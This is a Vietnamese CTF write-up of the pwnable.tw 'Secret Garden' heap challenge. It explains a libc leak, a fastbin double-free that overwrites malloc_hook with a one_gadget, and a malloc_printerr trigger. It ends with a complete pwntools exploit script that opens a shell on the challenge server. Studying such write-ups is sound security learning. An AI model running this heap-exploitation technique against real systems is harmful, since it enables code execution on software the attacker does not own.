# Secret Garden

# Challenge hôm nay là một chall heap cơ bản một chút nhưng có một số trick khá hay

## Phân tích và dịch ngược
Giống như các chall heap phổ biến khác đều có những hàm tạo chunk, xoá chunk, view chunk, chall này cũng vậy  

![menu1.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1627092268419/r6Ai3emAT.png)
Sau khi sử dụng pwninit để patch file elf và libc thì ta có đc thông tin sau:  

![ldd1.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1627092394139/Lvo31mko_.png)
File sử dụng glibc 2.23, malloc để tạo một flower mới, free để xoá các flower   
==> lỗi UAF và double free có thể được tận dụng ở đây  
Chúng ta sẽ tạo một struct flower để RE có code dễ nhìn hơn  
```C
struct flower{
    int32_t is_active;
    int32_t padd_0;
    char *name;
    char color[24];
}
```
## Content to exploit
Áp dụng cách làm ở bài [Tcachetear](https://vuotnh.hashnode.dev/tcachetear), ở bài này ta sẽ:  
* tạo một unsorted bin trong heap, sau đó show để leak được giá trị của libc_base, malloc_hook    
* Tạo một fake_chunk ở địa chỉ malloc_hook - 35 với size bất kì > 35 bằng double_free    
* Ghi dữ liệu vào chunk đã tạo, ghi đè giá trị của malloc_hook bằng one_gadget  
* Gọi đến malloc để thực thi one_gadget  

## Explain
### stage 1: leak libc

![leak_base.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1627092287028/4IOQFjJEs.png)
Về cách leak ở thì mình đã làm khá kĩ ở bài trên.  
Ở đây chúng ta bàn thêm về one_gadget.  
One_gadget thường được sử dụng khi chall cho file libc của elf, nó giúp chúng ta tìm được địa chỉ của system để lên shell nhanh hơn  
Với libc của bài này thì có one_gadget như sau:  

![one_gadget.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1627092366124/gpn7X2z2F.png)
* Dòng đầu tiên là offset từ libc base address đến địa chỉ của gadget  
* Dòng thứ hai khá quan trọng: đó là điều kiện cần thoả mãn để one_gadget có thể được thực thi  
* nếu không thoả mãn được các điều kiện này thì one_gadget sẽ không có tác dụng  

### stage 2: overwrite malloc_hook  
Chúng ta sẽ sử dụng [fast_bin_dup](https://github.com/shellphish/how2heap/blob/master/glibc_2.23/fastbin_dup_into_stack.c) để ghi đè dữ liệu    
Chúng ta có thể debug file ở link trên để hiểu hơn về fastbin_dup
```sh
gcc -Wall fast_bin_dup.c -o hello -no-pie #tạo file elf
export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/path/to/lib_file # lệnh này để setup lib trước khi chạy file elf
```
* Double free, ghi đè bk của fastbin bằng địa chỉ malloc_hook - 35 của fakechunk  

![heap1.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1627092299488/28jTRF8q_.png)
* malloc 2 lần để tạo chunk mới tạo địa chỉ fakechunk, ghi đè malloc_hook bằng one_gadget  

![fake1.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1627092307053/DTOgi1_7i.png)

![fake2.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1627092314234/dFXnutMYQ.png)

### stage 3: trigger malloc_hook
Vấn đề ở đây đặt ra là: tại sao đã overwrite malloc_hook mà ko thể gọi hàm malloc để thực thi  
* Nếu ta ghi vào free_hook thì có thể gọi đến hàm free để thực thi gadget, nhưng ở chall này xung quanh __free_hook có nhiều byte null => không bypass đc security check  
* Nếu ghi vào malloc_hook và gọi malloc thì ta cần nhảy vào hàm create_flower sau đó mới gọi được malloc, chương trình sẽ nhảy vào gadget, tuy nhiên khi nhảy vào create_flower thì các giá trị điều kiện của one_gadget nói ở trên sẽ không được thoải mãn => không thực thi gadget.  
* trigger malloc_printerr : double free một chunk thì sẽ gọi đến malloc, thực sự thì mk không hiểu rõ cái này cho lắm coi như đây là một trick nhỏ cần ghi nhớ :)), các bạn có thể đọc thêm để hiểu nó ở [ĐÂY](https://blog.osiris.cyber.nyu.edu/2017/09/30/csaw-ctf-2017-auir/)

## Eploit script
```python
from pwn import *
from binascii import hexlify
# conn = process('./secretgarden_patched')
conn = remote('chall.pwnable.tw',10203)
libc = ELF('./libc_64.so.6')
def create_flower(length,name,color):
    conn.sendlineafter(b'choice :',"1".encode())
    conn.sendlineafter(b"name :", str(length).encode())
    conn.sendlineafter(b"flower :",name.encode())
    conn.sendlineafter(b"flower :", color.encode())

def show_flower():
    conn.sendlineafter(b"choice :","2".encode())

def remove(index):
    conn.sendlineafter(b"choice :","3".encode())
    conn.sendlineafter(b"garden:",str(index).encode())

# break point 0x108D, put + 0x74D, put+0x325

#leak stack
create_flower(0x400,"aaaaaaaa","aaaaaaaa")
create_flower(20,"aaaaaaaa","aaaaaaaa")
create_flower(30,"aaaaaaaa","aaaaaaaa")


remove(1)
remove(0)
create_flower(256,"aaaaaaaa","aaaaaaaa")
show_flower()
leak_addr = int.from_bytes(conn.recvuntil(b'\x7f')[-6:],byteorder='little') + 0x6e
libc_base = leak_addr  - 0x3c3b78
malloc_hook = libc_base  + libc.sym['__malloc_hook']
one_gadget = libc_base + 0xef6c4
log.info("libc base address: %#x" % libc_base)
log.info("malloc hook address: %#x" % malloc_hook)
log.info("onegadget address: %#x" % one_gadget)


# fast bin dup and overwrite malloc_hook
create_flower(0x60,'aaaa','aaaa') #4
create_flower(0x60,'aaaa','aaaa')#5
create_flower(0x60,'aaaa','aaaa')#6

remove(4)
remove(5)
remove(4)
fast_bin_fake = 35
conn.sendlineafter(b'choice :',"1".encode())
conn.sendlineafter(b"name :", str(0x60).encode())
conn.sendlineafter(b"flower :",p64(malloc_hook - 35))
conn.sendlineafter(b"flower :", 'aaaa'.encode())

create_flower(0x60, 'bbbb', 'bbbb')
create_flower(0x60, 'bbbb', 'bbbb')

conn.sendlineafter(b'choice :',"1".encode())
conn.sendlineafter(b"name :", str(0x60).encode())
conn.sendlineafter(b"flower :", b'a'*19 + p64(one_gadget))
conn.sendlineafter(b"flower :", 'aaaa'.encode())

# trigger malloc
remove(4)
remove(4)

conn.interactive()

```